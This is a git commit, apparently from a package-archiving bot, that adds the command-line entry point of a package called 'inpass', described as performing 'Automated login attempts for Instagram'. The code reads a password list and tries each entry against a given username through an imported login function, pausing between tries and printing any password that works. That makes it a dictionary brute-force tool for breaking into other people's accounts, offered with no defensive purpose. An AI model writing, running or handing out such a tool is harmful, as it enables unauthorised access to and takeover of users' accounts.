727f92b5c6bfc19a2548ad523c5b7bca216155e3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-03 03:04:39 +0000

    Add package inpass/1.0.0/inpass-1.0.0.tar.gz

---
+++ packages/inpass/inpass-1.0.0.tar.gz/inpass-1.0.0/inpass/cli.py
@@ -0,0 +1,23 @@
+import argparse
+import time
+from inpass import login
+
+def main():
+    parser = argparse.ArgumentParser(description='Automated login attempts for Instagram.')
+    parser.add_argument('--username', required=True, help='Instagram username')
+    parser.add_argument('--password-file', required=True, help='File containing passwords')
+
+    args = parser.parse_args()
+
+    with open(args.password_file, 'r') as file:
+        passwords = file.read().splitlines()
+
+    for password in passwords:
+        if login(args.username, password):
+            print(f"Password match: {password}")
+            break
+        else:
+            print(f"Password {password} not matching")
+        time.sleep(1)
+    else:
+        print("All passwords failed.")
